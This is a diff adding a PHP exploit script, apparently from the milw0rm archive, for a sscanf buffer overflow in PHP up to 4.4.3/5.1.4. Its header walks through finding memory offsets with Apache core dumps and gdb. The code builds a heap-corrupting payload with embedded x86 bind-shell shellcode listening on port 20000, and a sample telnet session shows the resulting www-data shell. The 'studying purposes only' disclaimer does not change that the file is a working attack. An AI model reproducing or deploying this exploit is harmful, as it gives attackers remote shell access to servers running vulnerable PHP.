@@ -1,0 +1,137 @@
+<?
+/***********************************************************
+ * hoagie_php_sscanf.php
+ * PHP <= 4.4.3 / 5.1.4 local buffer overflow exploit
+ *
+ * howto get offsets:
+ * (set $base_addr to 0x41414141)
+ * # ulimit -c 20000
+ * # /etc/init.d/apache restart
+ * (execute script via web browser)
+ * # tail /var/log/apache/error.log
+ * ...
+ * [Wed Aug 16 15:07:10 2006] [notice] child pid 28222 exit signal Segmentation fault (11), possible coredump in /tmp 
+ * ...
+ * $ gdb /usr/sbin/apache /tmp/core
+ * ...
+ * ...
+ * #0  0x40422b2d in php_sscanf_internal () from /usr/lib/apache/1.3/libphp4.so
+ * (gdb) x/250 $edx
+ * ...
+ * 0x83ae16c:      0x41414141      0x41414141      0x41414141      0x41414141
+ * 0x83ae17c:      0xdeadbabe      0x41414145      0x4141415d      0x00000001
+ *                                 ^^^^^^^^^^
+ *                                 start of our buffer (0x83ae180) = $base_addr
+ * 0x83ae18c:      0x00000008      0x4141415d      0x0833d248      0x00000400
+ * 0x83ae19c:      0x909006eb      0x90909090      0xe3f7db31      0x435366b0
+ *                                                 ^^^^^^^^^^
+ *                                                 start of shell code (0x83ae1a4)
+ * 0x83ae1ac:      0x89534353      0x80cd4be1      0x6652c789      0x43204e68
+ * 0x83ae1bc:      0xe1895366      0xd0f6efb0      0x89575150      0xcd66b0e1
+ * 0x83ae1cc:      0x4366b080      0x5080cd43      0xe1895750      0xcd66b043
+ * 0x83ae1dc:      0x89d98980      0x2c6fb0c3      0x80cd4930      0x51f6e241
+ * 0x83ae1ec:      0x732f6e68      0x2f2f6868      0xe3896962      0xe1895351
+ * 0x83ae1fc:      0xd0f6f4b0      0x414180cd      0x41414141      0x41414141
+ * 0x83ae20c:      0x41414141      0x41414141      0x41414141      0x41414141
+ * ...
+ * (gdb) quit
+ * #
+ * (change $base_addr in exploit and now call url again)
+ * # gdb /usr/sbin/apache /tmp/core
+ * #0  0x40475e73 in _efree ()
+ * from /usr/lib/apache/1.3/libphp4.so
+ * (gdb) x/4w $ebp
+ * 0xbfffb018:     0xbfffb038      0x40484241      0x0812a2f4      0xbfffb038
+ *                                 ^^^^^^^^^^
+ *                                 return address (return address location = 0xbfffb01c)
+ * (change $rec_log in exploit and call url again)
+ * $ telnet 127.0.0.1 20000
+ * Trying 127.0.0.1...
+ * Connected to localhost.
+ * Escape character is '^]'.
+ * id;
+ * uid=33(www-data) gid=33(www-data) groups=33(www-data)
+ * exit;
+ * Connection closed by foreign host.
+ * $
+ *
+ * NOTE: Because of PHP memory allocation this exploit depends on filename, pathname
+ *       content etc... (because each line/byte will change emalloc() behavior
+ *
+ * Credits: Heintz (discovered this bug)
+ *          BigHawk (bind shell code)
+ *          Greuff (void.at)
+ *
+ * THIS FILE IS FOR STUDYING PURPOSES ONLY AND A PROOF-OF-
+ * CONCEPT. THE AUTHOR CAN NOT BE HELD RESPONSIBLE FOR ANY
+ * DAMAGE DONE USING THIS PROGRAM.
+ *
+ * VOID.AT Security
+ * andi@void.at
+ * http://www.void.at
+ *
+ ************************************************************/
+
+   /* base_addr for buffer in memory */
+   $base_addr = 0x812a260;
+   $base_addr_fill = 0x16;
+   /* byte 0 = fill up, byte 1 = refcount, byte 2 = is_ref, byte 3 = type */
+   $zval_attr = 0x00000008;
+   /* will be overwritten to execute our shellcode */
+   $ret_loc = 0xbfffb01c;
+   /* just for searching */
+   $pattern = 0xdeadbabe;
+
+   function long2str($addr) {
+      return pack("V", $addr);
+   }
+
+   $data =
+   	  /* fill up memory */
+          str_repeat(long2str($base_addr), $base_addr_fill) . 
+          /* pattern */
+          long2str($pattern) .
+   	  /* current = base_addr */
+	  long2str($base_addr + 0x4) .	
+          /* *current = _zval_struct */
+	  /* _zval_struct */
+	  /* _zvalue_value */
+	  /* _zvalue_value.str.val */
+          long2str($base_addr + 0x10 + 0xc) .
+	  /* _zvalue_value_str.len */
+	  long2str(0x00000001) .
+	  /* _zval_struct.type, _zval_struct.is_ref, _zval_struct.refcount */
+          long2str($zval_attr) .
+	  /* _zend_mem_header */
+	  /* _zend_mem_header.pNext = start of shellcode  */
+          long2str($base_addr + 28) .
+	  /* _zend_mem_header.pLast */
+          long2str($ret_loc) .
+	  /* zend_mem_header.size, zend_mem_header.cached */
+	  long2str(0x000000400) .
+	  /* jump over next six bytes */
+	  "\xeb\x06\x90\x90" .
+	  /* this bytes will be overwritten by efree() */
+	  "\x90\x90\x90\x90" .
+	  /* shell code starts here -
+	   * BigHawk bind() version - just a little update to get rid
+	   * of 0x3f 
+	   */
+	  "\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd" .
+	  "\x80\x89\xc7\x52\x66\x68\x4e\x20\x43\x66\x53\x89\xe1\xb0\xef" .
+	  "\xf6\xd0\x50\x51\x57\x89\xe1\xb0\x66\xcd\x80\xb0\x66\x43\x43" .
+	  "\xcd\x80\x50\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80\x89\xd9\x89" .
+	  "\xc3\xb0\x6f\x2c\x30\x49\xcd\x80\x41\xe2\xf6\x51\x68\x6e\x2f" .
+	  "\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x51\x53\x89\xe1\xb0\xf4" .
+	  "\xf6\xd0\xcd\x80" .
+	  /* fill up memory */
+	  str_repeat(long2str($base_addr), $base_addr_fill);
+
+   /* fill up memory with emalloc() for sscanf() */
+   quotemeta($data);
+
+   /* trigger exploit */
+   sscanf($data, '%1$s', $str);
+?>
+
+# milw0rm.com [2006-08-16]
